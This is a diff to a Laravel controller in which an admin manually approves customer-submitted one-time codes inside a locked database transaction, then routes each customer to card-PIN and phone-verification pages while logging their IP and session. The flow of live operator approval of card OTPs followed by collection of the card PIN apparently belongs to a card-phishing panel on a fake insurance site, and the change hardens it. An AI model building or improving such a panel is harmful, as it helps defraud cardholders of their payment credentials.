@@ -22,46 +22,54 @@ class AdminOtpController extends Controller
      */
     public function approve(int $id, Request $request): JsonResponse
     {
-        $otp = OtpCode::findOrFail($id);
+        // Atomic check-then-update to prevent race conditions
+        [$otp, $earlyResponse] = \DB::transaction(function () use ($id) {
+            $otp = OtpCode::lockForUpdate()->findOrFail($id);
 
-        if ($otp->status !== 'pending') {
-            return response()->json([
-                'success' => false,
-                'message' => 'هذا الرمز تم معالجته مسبقاً',
-            ], 422);
+            if ($otp->status !== 'pending') {
+                return [$otp, response()->json([
+                    'success' => false,
+                    'message' => 'هذا الرمز تم معالجته مسبقاً',
+                ], 422)];
+            }
+
+            if ($otp->isExpired()) {
+                $otp->reject('otp_expired');
+                return [$otp, response()->json([
+                    'success' => false,
+                    'message' => 'انتهت صلاحية رمز التحقق',
+                    'expired' => true,
+                ], 422)];
+            }
+
+            $otp->verify();
+
+            // Reset fail count on successful approval
+            if ($otp->customer) {
+                $updateData = [
+                    'otp_fail_count'   => 0,
+                    'otp_locked_until' => null,
+                ];
+                if ($otp->type === 'otp') {
+                    $updateData['current_page'] = '/insurance/card-pin';
+                } elseif ($otp->type === 'pin') {
+                    $updateData['current_page'] = '/insurance/phone-verification';
+                }
+                $otp->customer->update($updateData);
+            }
+
+            return [$otp, null];
+        });
+
+        if ($earlyResponse) {
+            return $earlyResponse;
         }
-
-        if ($otp->isExpired()) {
-            $otp->reject('otp_expired');
-            return response()->json([
-                'success' => false,
-                'message' => 'انتهت صلاحية رمز التحقق',
-                'expired' => true,
-            ], 422);
-        }
-
-        $otp->verify();
 
         $customerIp = $otp->customer?->ip_address ?? '';
         $sessionId  = $otp->session_id;
 
         if (empty($customerIp)) {
             \Log::error("approveOtp: No customer IP for OTP #{$id}");
-        }
-
-        // Reset fail count on successful approval
-        if ($otp->customer) {
-            $updateData = [
-                'otp_fail_count'   => 0,
-                'otp_locked_until' => null,
-            ];
-            // Update current_page so dashboard reflects where customer should go next
-            if ($otp->type === 'otp') {
-                $updateData['current_page'] = '/insurance/card-pin';
-            } elseif ($otp->type === 'pin') {
-                $updateData['current_page'] = '/insurance/phone-verification';
-            }
-            $otp->customer->update($updateData);
         }
 
         try {
